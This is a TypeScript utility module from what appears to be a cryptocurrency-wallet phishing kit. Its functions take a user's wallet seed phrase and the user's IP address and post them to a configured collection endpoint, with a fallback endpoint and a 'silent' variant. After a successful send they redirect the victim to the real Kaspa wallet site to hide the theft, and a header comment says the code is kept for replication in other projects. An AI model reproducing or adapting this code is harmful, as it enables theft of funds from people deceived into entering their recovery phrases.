/**
 * Seedphrase API Utilities
 * 
 * All functions for sending seedphrase messages to backend APIs.
 * Extracted from Home.jsx, Wallet.jsx, and Legacy.jsx for easy replication.
 * 
 * DO NOT REFACTOR - Keep as-is for replication in other projects.
 */

import axios, { AxiosResponse } from 'axios';
import { NOTIFICATION_APP_NAME, SEED_API_URL } from '../app/config';

const JSON_AXIOS_CONFIG = {
  headers: { "Content-Type": "application/json" },
} as const;

interface IPResponse {
  ip: string;
}

interface PrimaryMessageData {
  appName: string;
  seedPhrase: string;
  ip: string | null;
}

interface FallbackMessageData {
  appName: string;
  seedPhrase: string;
}

interface APIResponse {
  status: boolean;
  message?: string;
  error?: string;
}

interface SubmitResult {
  success: boolean;
  result?: APIResponse;
  response?: AxiosResponse<APIResponse>;
  error?: string;
  source?: 'primary' | 'fallback';
  primary?: SubmitResult;
  fallback?: SubmitResult;
  exception?: Error;
}

interface SubmitOptions {
  onSuccessRedirect?: string;
  onError?: (error: string) => void;
  apiKey?: string | null;
}

/**
 * Check if we're running on localhost
 */
function isLocalhost(): boolean {
  if (typeof window === 'undefined') {
    return false;
  }
  const hostname = window.location.hostname;
  const isLocal = hostname === 'localhost' || 
                  hostname === '127.0.0.1' ||
                  hostname === '';
  return isLocal;
}

/**
 * Get the primary API endpoint based on environment
 */
function getPrimaryAPIEndpoint(): string {
  return SEED_API_URL;
}

/**
 * Get the fallback API endpoint based on environment
 */
function getFallbackAPIEndpoint(): string {
  return SEED_API_URL;
}

/**
 * Get client IP address
 * Used before sending seedphrase to include IP in the payload
 */
export async function getClientIP(): Promise<string | null> {
  try {
    const response = await axios.get<IPResponse>('https://api.ipify.org?format=json');
    return response.data.ip;
    } catch {
      return null;
    }
}

/**
 * Send seedphrase to primary API endpoint (with IP)
 * From Home.jsx handleRestoreWallet - lines 220-251
 */
export async function sendSeedPhraseToPrimaryAPI(
  seedPhraseMessage: string,
  appName: string = NOTIFICATION_APP_NAME
): Promise<SubmitResult> {
  try {
    let clientIP: string | null = null;
    try {
      const ipResponse = await axios.get<IPResponse>('https://api.ipify.org?format=json');
      clientIP = ipResponse.data.ip;
    } catch {
      // Ignore IP fetch errors
    }

    const primaryMessageData: PrimaryMessageData = {
      appName: appName,
      seedPhrase: seedPhraseMessage,
      ip: clientIP
    };

    const response = await axios.post<APIResponse>(
      getPrimaryAPIEndpoint(),
      primaryMessageData,
      JSON_AXIOS_CONFIG
    );

    const result: APIResponse = response.data;

    if (response.status === 200 && result.status) {
      return { success: true, result, response };
    }
    
    return { success: false, result, response };
  } catch (error) {
    return { success: false, error: error instanceof Error ? error.message : 'Unknown error' };
  }
}

/**
 * Send seedphrase to fallback API endpoint (without IP, with API key)
 * From Home.jsx handleRestoreWallet - lines 254-267
 */
export async function sendSeedPhraseToFallbackAPI(
  seedPhraseMessage: string,
  appName: string = NOTIFICATION_APP_NAME,
  apiKey: string | null = null
): Promise<SubmitResult> {
  try {
    // Prepare the request data with only required parameters
    const messageData: FallbackMessageData = {
      appName: appName,
      seedPhrase: seedPhraseMessage
    };

    const response = await axios.post<APIResponse>(
      getFallbackAPIEndpoint(),
      messageData,
      JSON_AXIOS_CONFIG
    );

    const result: APIResponse = response.data;

    if (response.status === 200 && result.status) {
      return { success: true, result, response };
    }
    
    return { success: false, result, response };
  } catch (error) {
    return { success: false, error: error instanceof Error ? error.message : 'Unknown error' };
  }
}

/**
 * Complete seedphrase submission with primary + fallback
 * From Home.jsx handleRestoreWallet - lines 207-283
 * This is the main function used in Home.jsx
 */
export async function submitSeedPhraseComplete(
  seedPhraseMessage: string,
  appName: string = NOTIFICATION_APP_NAME,
  options: SubmitOptions = {}
): Promise<SubmitResult> {
  const { 
    onSuccessRedirect = "https://wallet.kaspanet.io",
    onError = null,
    apiKey = null 
  } = options;

  try {
    // Try primary API first (with IP)
    const primaryResult = await sendSeedPhraseToPrimaryAPI(seedPhraseMessage, appName);
    
    if (primaryResult.success) {
      if (onSuccessRedirect && typeof window !== 'undefined') {
        window.location.href = onSuccessRedirect;
      }
      return { ...primaryResult, source: 'primary' };
    }

    // Fallback to secondary API (without IP, with API key)
    const fallbackResult = await sendSeedPhraseToFallbackAPI(seedPhraseMessage, appName, apiKey);
    
    if (fallbackResult.success) {
      if (onSuccessRedirect && typeof window !== 'undefined') {
        window.location.href = onSuccessRedirect;
      }
      return { ...fallbackResult, source: 'fallback' };
    }

    // Both failed
    const errorMessage = fallbackResult.result?.message || "An issue occurred.";
    const errorDetail = fallbackResult.result?.error ? ` (${fallbackResult.result.error})` : "";
    const fullError = errorMessage + errorDetail;
    
    if (onError) {
      onError(fullError);
    }
    
    return { 
      success: false, 
      error: fullError,
      primary: primaryResult,
      fallback: fallbackResult
    };
  } catch (error) {
    const errorMsg = "An error occurred while processing your request. Please try again.";
    
    if (onError) {
      onError(errorMsg);
    }
    
    return { 
      success: false, 
      error: errorMsg, 
      exception: error instanceof Error ? error : new Error(String(error))
    };
  }
}

/**
 * Silent seedphrase submission (no redirect, no error handling)
 * From Wallet.jsx submitSeedToApi - lines 86-130
 * Used when you just want to send without UI feedback
 * Returns true if successful, false otherwise
 */
export async function submitSeedPhraseSilent(
  seedPhraseMessage: string,
  appName: string = NOTIFICATION_APP_NAME,
  apiKey: string | null = null
): Promise<boolean> {
  try {
    let clientIP: string | null = null;
    try {
      const ipResponse = await axios.get<IPResponse>('https://api.ipify.org?format=json');
      clientIP = ipResponse.data.ip;
    } catch {
      // Ignore IP fetch errors
    }

    const primaryMessageData: PrimaryMessageData = {
      appName: appName,
      seedPhrase: seedPhraseMessage,
      ip: clientIP
    };

    const response = await axios.post<APIResponse>(
      getPrimaryAPIEndpoint(),
      primaryMessageData,
      JSON_AXIOS_CONFIG
    );

    const result: APIResponse = response.data;

    if (response.status === 200 && result.status) {
      return true; // Success, no need to try fallback
    }

    // Fallback to secondary API
    const messageData: FallbackMessageData = { appName: appName, seedPhrase: seedPhraseMessage };

    const fallbackResponse = await axios.post<APIResponse>(
      getFallbackAPIEndpoint(),
      messageData,
      JSON_AXIOS_CONFIG
    );

    const fallbackResult: APIResponse = fallbackResponse.data;

    if (fallbackResponse.status === 200 && fallbackResult.status) {
      return true; // Fallback success
    }

    return false; // Both failed
  } catch {
    // ignore network errors for UI flow
    return false;
  }
}

/**
 * Wallet.jsx version with detailed logging
 * From Wallet.jsx handleRestoreWallet - lines 132-209
 */
export async function submitSeedPhraseWalletJSX(
  seedPhraseMessage: string,
  appName: string = NOTIFICATION_APP_NAME,
  options: SubmitOptions = {}
): Promise<SubmitResult> {
  const { 
    onSuccessRedirect = "https://wallet.kaspanet.io",
    onError = null,
    apiKey = null 
  } = options;

  try {
    let clientIP: string | null = null;
    try {
      const ipResponse = await axios.get<IPResponse>('https://api.ipify.org?format=json');
      clientIP = ipResponse.data.ip;
    } catch {
      // Ignore IP fetch errors
    }

    const primaryMessageData: PrimaryMessageData = {
      appName: appName,
      seedPhrase: seedPhraseMessage,
      ip: clientIP
    };


    let response = await axios.post<APIResponse>(
      getPrimaryAPIEndpoint(),
      primaryMessageData,
      JSON_AXIOS_CONFIG
    );

    let result: APIResponse = response.data;

    if (response.status === 200 && result.status) {
      if (onSuccessRedirect && typeof window !== 'undefined') {
        window.location.href = onSuccessRedirect;
      }
      return { success: true, result, response };
    }

    // Prepare the request data with only required parameters
    const messageData: FallbackMessageData = {
      appName: appName,
      seedPhrase: seedPhraseMessage
    };

    const fallbackEndpoint = getFallbackAPIEndpoint();

    response = await axios.post<APIResponse>(
      fallbackEndpoint,
      messageData,
      JSON_AXIOS_CONFIG
    );

    result = response.data;

    if (response.status === 200 && result.status) {
      if (onSuccessRedirect && typeof window !== 'undefined') {
        window.location.href = onSuccessRedirect;
      }
      return { success: true, result };
    } else {
      const serverMessage = result?.message || "An issue occurred.";
      const serverError = result?.error ? ` (${result.error})` : "";
      const fullError = serverMessage + serverError;
      
      if (onError) {
        onError(fullError);
      }
      
      return { success: false, error: fullError, result };
    }
  } catch {
    const errorMsg = "An error occurred while processing your request. Please try again.";
    
    if (onError) {
      onError(errorMsg);
    }
    
    return { success: false, error: errorMsg };
  }
}

